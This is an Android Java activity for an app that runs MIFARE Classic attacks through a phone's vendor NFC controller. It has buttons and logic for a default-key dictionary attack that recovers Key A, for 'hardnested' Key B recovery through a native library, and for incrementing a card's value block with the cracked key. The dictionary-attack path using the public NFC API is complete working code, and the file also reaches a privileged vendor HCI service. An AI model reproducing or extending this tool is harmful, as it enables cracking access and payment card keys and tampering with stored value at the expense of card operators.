package com.redmi.iceman.mfc;

import android.app.Activity;
import android.graphics.Color;
import android.nfc.NfcAdapter;
import android.nfc.Tag;
import android.nfc.tech.MifareClassic;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import com.redmi.iceman.probe.MfcNative;
import com.redmi.iceman.probe.PtmTransport;
import com.redmi.iceman.probe.TmsAccess;
import com.tms.nfc.IHciAdapter;
import com.tms.nfc.ITmsNfcAdapter;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

/**
 * Standalone app for the three target Iceman commands ported to the
 * phone's TMS/THN31 NFC controller: autopwn (Key A dictionary attack),
 * hardnested (Key A -> Key B), and value --inc. See
 * docs/tms_protocol.md and research/iceman-hf-mf-command-mapping.md for
 * the underlying architecture -- this app is just the UI shell; all the
 * real work is in android/mifare-native/ (libmfcbridge.so) and the
 * com.redmi.iceman.probe support classes (TmsAccess/PtmTransport/MfcNative),
 * reused as-is from the diagnostic probe app.
 */
public class MainActivity extends Activity {
    private static final String TAG = "IcemanMfc";

    private TextView logView;
    private TextView statusView;
    private EditText blockInput;
    private EditText trgBlockInput;
    private EditText keyInput;
    private EditText deltaInput;

    private ITmsNfcAdapter adapter;
    private PtmTransport ptmTransport;
    private boolean connected = false;
    private volatile boolean connecting = false;
    private boolean mfcInited = false;
    private Tag lastTag;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(24, 48, 24, 24);

        statusView = new TextView(this);
        statusView.setText("Not connected");
        root.addView(statusView);

        addButton(root, "Connect (TMS + PTM + reader mode)", new View.OnClickListener() {
            public void onClick(View v) {
                if (connecting) { log("already connecting, please wait..."); return; }
                connecting = true;
                new Thread(new Runnable() {
                    public void run() {
                        try { doConnect(true); } finally { connecting = false; }
                    }
                }).start();
            }
        });
        addButton(root, "Connect (reader mode only, NO PTM)", new View.OnClickListener() {
            public void onClick(View v) {
                if (connecting) { log("already connecting, please wait..."); return; }
                connecting = true;
                new Thread(new Runnable() {
                    public void run() {
                        try { doConnect(false); } finally { connecting = false; }
                    }
                }).start();
            }
        });

        blockInput = new EditText(this);
        blockInput.setHint("source block, e.g. 0");
        root.addView(blockInput);

        trgBlockInput = new EditText(this);
        trgBlockInput.setHint("target block (hardnested), e.g. 4");
        root.addView(trgBlockInput);

        keyInput = new EditText(this);
        keyInput.setHint("key hex (12 chars), e.g. FFFFFFFFFFFF");
        root.addView(keyInput);

        deltaInput = new EditText(this);
        deltaInput.setHint("value --inc delta, e.g. 1");
        root.addView(deltaInput);

        addButton(root, "hf mf autopwn: recover Key A of block", new View.OnClickListener() {
            public void onClick(View v) { doAutopwn(); }
        });
        addButton(root, "hf mf hardnested: Key A -> Key B of target block", new View.OnClickListener() {
            public void onClick(View v) { doHardnested(); }
        });
        addButton(root, "hf mf value --inc with Key B", new View.OnClickListener() {
            public void onClick(View v) { doValueIncrement(); }
        });
        addButton(root, "TEST: autopwn via public MifareClassic API (no PTM)", new View.OnClickListener() {
            public void onClick(View v) { doAutopwnPublicApi(); }
        });
        addButton(root, "Clear log", new View.OnClickListener() {
            public void onClick(View v) { logView.setText(""); }
        });

        ScrollView scroll = new ScrollView(this);
        logView = new TextView(this);
        logView.setTextColor(Color.GREEN);
        logView.setTextIsSelectable(true);
        scroll.addView(logView);
        root.addView(scroll, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f));

        setContentView(root);
    }

    private void addButton(LinearLayout root, String text, View.OnClickListener l) {
        Button b = new Button(this);
        b.setText(text);
        b.setOnClickListener(l);
        root.addView(b);
    }

    private void log(String s) {
        Log.d(TAG, s);
        final String line = s;
        runOnUiThread(new Runnable() {
            public void run() { logView.append(line + "\n"); }
        });
    }

    private void setStatus(final String s) {
        runOnUiThread(new Runnable() {
            public void run() { statusView.setText(s); }
        });
    }

    // PTM (passthrough mode) appears to take the controller out of its
    // normal polling loop -- enableReaderMode()'s onTagDiscovered stops
    // firing while PTM is open. So this connects PTM only when usePtm is
    // true; the public-API test path uses usePtm=false to avoid the
    // conflict entirely.
    private void doConnect(boolean usePtm) {
        try {
            if (usePtm) {
                adapter = TmsAccess.getAdapter();
                log("OK: got ITmsNfcAdapter");

                IBinder b = adapter.getHciAdapterService();
                if (b == null) { log("FAIL: hci adapter service binder is null (WRITE_SECURE_SETTINGS not granted?)"); return; }
                IHciAdapter hciAdapter = IHciAdapter.Stub.asInterface(b);
                ptmTransport = new PtmTransport(hciAdapter);
                log("OK: PTM open");
            } else {
                log("skipping PTM (reader-mode-only connect)");
            }

            NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this);
            if (nfcAdapter == null) { log("FAIL: no NfcAdapter"); return; }
            Bundle options = new Bundle();
            nfcAdapter.enableReaderMode(this, new NfcAdapter.ReaderCallback() {
                        public void onTagDiscovered(Tag tag) {
                            lastTag = tag;
                            setStatus("Tag present: uid=" + toHex(tag.getId()));
                            log("tag discovered, uid=" + toHex(tag.getId()));
                        }
                    },
                    NfcAdapter.FLAG_READER_NFC_A | NfcAdapter.FLAG_READER_SKIP_NDEF_CHECK
                            | NfcAdapter.FLAG_READER_NO_PLATFORM_SOUNDS,
                    options);
            log("OK: reader mode enabled, present a MIFARE Classic card");
            connected = true;
            setStatus("Connected, waiting for a tag...");
        } catch (Exception e) {
            log("FAIL connect: " + e);
            Log.e(TAG, "connect failed", e);
        }
    }

    private String ensureResourcesExtracted() {
        File base = new File(getFilesDir(), "resources/hardnested_tables");
        File marker = new File(getFilesDir(), ".resources_extracted");
        if (marker.exists() && base.isDirectory() && base.list() != null && base.list().length > 0) {
            return getFilesDir().getAbsolutePath();
        }
        try {
            base.mkdirs();
            String[] names = getAssets().list("resources/hardnested_tables");
            for (String name : names) {
                InputStream in = getAssets().open("resources/hardnested_tables/" + name);
                OutputStream out = new FileOutputStream(new File(base, name));
                byte[] buf = new byte[8192];
                int n;
                while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
                in.close();
                out.close();
            }
            new FileOutputStream(marker).close();
            log("extracted " + names.length + " hardnested table files");
        } catch (Exception e) {
            log("FAIL extracting resources: " + e);
            Log.e(TAG, "resource extraction failed", e);
        }
        return getFilesDir().getAbsolutePath();
    }

    private boolean ensureMfcReady() {
        if (!connected || ptmTransport == null) { log("not connected, tap Connect first"); return false; }
        if (lastTag == null) { log("no tag detected yet, present a card first"); return false; }
        if (!mfcInited) {
            String resDir = ensureResourcesExtracted();
            int ret = MfcNative.nativeInit(ptmTransport, resDir);
            if (ret != 0) { log("FAIL nativeInit: " + ret); return false; }
            mfcInited = true;
        }
        byte[] uidBytes = lastTag.getId();
        int uid = 0;
        for (int i = 0; i < 4 && i < uidBytes.length; i++) {
            uid = (uid << 8) | (uidBytes[i] & 0xFF);
        }
        MfcNative.nativeSetUid(uid);
        return true;
    }

    private int parseBlock(EditText field, int fallback) {
        try {
            return Integer.parseInt(field.getText().toString().trim());
        } catch (Exception e) {
            return fallback;
        }
    }

    private void setKeyField(final String key) {
        runOnUiThread(new Runnable() {
            public void run() { keyInput.setText(key); }
        });
    }

    // Diagnostic path: bypasses PTM/native entirely, uses only the public,
    // documented android.nfc.tech.MifareClassic API (Tag.transceive() under
    // the hood). TMS's own TmsM1Tag.authenticate() in TmsNfcService.apk
    // uses the exact same [0x60/0x61][block][uid(4)][key(6)] command shape
    // through the same native doTransceive() that backs this public API, so
    // if this works it means autopwn/value-inc don't need PTM at all -- the
    // PTM/header investigation only matters for hardnested's raw-nonce+parity
    // needs.
    private void doAutopwnPublicApi() {
        if (!connected || lastTag == null) { log("not connected / no tag, tap Connect and present a card first"); return; }
        final int block = parseBlock(blockInput, 0);
        log("AUTOPWN (public API): trying dictionary against block " + block + " Key A ...");
        new Thread(new Runnable() {
            public void run() {
                MifareClassic mfc = MifareClassic.get(lastTag);
                if (mfc == null) {
                    log("AUTOPWN (public API): tag is not MifareClassic");
                    return;
                }
                try {
                    mfc.connect();
                    int sector = mfc.blockToSector(block);
                    log("AUTOPWN (public API): sector=" + sector + ", type=" + mfc.getType() + ", size=" + mfc.getSize());
                    String[] keys = loadDictionary();
                    log("AUTOPWN (public API): loaded " + keys.length + " keys");
                    int tried = 0;
                    for (String hex : keys) {
                        tried++;
                        byte[] key = hexToBytes(hex);
                        boolean ok;
                        try {
                            ok = mfc.authenticateSectorWithKeyA(sector, key);
                        } catch (Exception e) {
                            ok = false;
                        }
                        if (ok) {
                            log("AUTOPWN (public API): Key A = " + hex + " (tried " + tried + "/" + keys.length + ")");
                            setKeyField(hex);
                            mfc.close();
                            return;
                        }
                    }
                    log("AUTOPWN (public API): no default key worked after trying " + tried + " keys");
                    mfc.close();
                } catch (Exception e) {
                    log("AUTOPWN (public API) FAIL: " + e);
                    Log.e(TAG, "public autopwn failed", e);
                }
            }
        }).start();
    }

    private String[] loadDictionary() throws Exception {
        java.util.ArrayList<String> keys = new java.util.ArrayList<>();
        InputStream in = getAssets().open("mfc_default_keys.dic");
        java.io.BufferedReader r = new java.io.BufferedReader(new java.io.InputStreamReader(in));
        String line;
        while ((line = r.readLine()) != null) {
            line = line.trim();
            if (line.length() == 12 && line.matches("[0-9A-Fa-f]{12}")) {
                keys.add(line);
            }
        }
        r.close();
        return keys.toArray(new String[0]);
    }

    private static byte[] hexToBytes(String hex) {
        byte[] out = new byte[hex.length() / 2];
        for (int i = 0; i < out.length; i++) {
            out[i] = (byte) Integer.parseInt(hex.substring(i * 2, i * 2 + 2), 16);
        }
        return out;
    }

    private void doAutopwn() {
        if (!ensureMfcReady()) return;
        final int block = parseBlock(blockInput, 0);
        log("AUTOPWN: trying default-key dictionary against block " + block + " Key A ...");
        new Thread(new Runnable() {
            public void run() {
                String key = MfcNative.nativeAutopwn(block);
                if (key == null) {
                    log("AUTOPWN: no default key worked");
                } else {
                    log("AUTOPWN: Key A = " + key);
                    setKeyField(key);
                }
            }
        }).start();
    }

    private void doHardnested() {
        if (!ensureMfcReady()) return;
        final int block = parseBlock(blockInput, 0);
        final int trgBlock = parseBlock(trgBlockInput, block);
        final String keyA = keyInput.getText().toString().trim();
        if (keyA.length() != 12) { log("put the known Key A (12 hex chars) in the key field first"); return; }
        log("HARDNESTED: acquiring nonces against block " + trgBlock + " Key B, using known Key A=" + keyA
                + " on block " + block + " ... this can take a while");
        new Thread(new Runnable() {
            public void run() {
                String keyB = MfcNative.nativeHardnested(block, keyA, trgBlock);
                if (keyB == null) {
                    log("HARDNESTED: failed");
                } else {
                    log("HARDNESTED: Key B = " + keyB);
                    setKeyField(keyB);
                }
            }
        }).start();
    }

    private void doValueIncrement() {
        if (!ensureMfcReady()) return;
        final int block = parseBlock(blockInput, 0);
        final String keyB = keyInput.getText().toString().trim();
        if (keyB.length() != 12) { log("put Key B (12 hex chars) in the key field first"); return; }
        int delta;
        try {
            delta = Integer.parseInt(deltaInput.getText().toString().trim());
        } catch (Exception e) {
            delta = 1;
        }
        final int fdelta = delta;
        log("VALUE --inc: block " + block + " delta " + fdelta + " with Key B=" + keyB);
        new Thread(new Runnable() {
            public void run() {
                int ret = MfcNative.nativeValueIncrement(block, keyB, fdelta);
                log("VALUE --inc result = " + ret + (ret == 0 ? " (OK)" : " (FAILED)"));
            }
        }).start();
    }

    private static String toHex(byte[] b) {
        if (b == null) return "null";
        StringBuilder sb = new StringBuilder();
        for (byte x : b) sb.append(String.format("%02X", x));
        return sb.toString();
    }
}
